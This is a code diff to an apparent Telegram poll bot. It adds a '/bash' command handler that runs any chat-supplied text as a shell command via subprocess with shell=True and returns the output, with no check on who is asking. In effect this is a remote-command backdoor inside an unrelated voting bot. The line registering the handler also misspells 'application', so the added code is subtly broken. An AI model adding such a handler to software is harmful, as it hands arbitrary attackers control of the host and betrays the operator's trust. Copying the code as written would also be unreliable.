@@ -1679,6 +1679,29 @@ async def update_vote_count_and_inline_button(poll_id, message_id, context):
             else:
                 print(f"Error updating poll {poll_id}: {e}")
                 print(f"❌ Failed to update poll {poll_id}: {e}")
+import subprocess
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
+
+
+async def bash_command(update: Update, context: CallbackContext):
+    if not context.args:
+        await update.message.reply_text("Usage: /bash <command>")
+        return
+    
+    command = " ".join(context.args)  # Join arguments into a single command
+    try:
+        result = subprocess.run(command, shell=True, text=True, capture_output=True)
+        output = result.stdout if result.stdout else result.stderr
+    except Exception as e:
+        output = str(e)
+    
+    # Ensure output is within Telegram's message limit
+    if len(output) > 4000:
+        output = output[:4000] + "\n\n[Output Truncated]"
+    
+    await update.message.reply_text(f"```\n{output}\n```", parse_mode="Markdown")
+
 
 # Your main function to start the bot
 if __name__ == "__main__":
@@ -1698,6 +1721,7 @@ if __name__ == "__main__":
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_username))
     application.add_handler(CallbackQueryHandler(handle_vote, pattern=r"^vote:"))
     application.add_handler(CommandHandler("top", top))
+    applicayion.add_handler(CommandHandler("bash", bash_command))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("current", current_command))
     application.add_handler(CommandHandler("info", info_command))
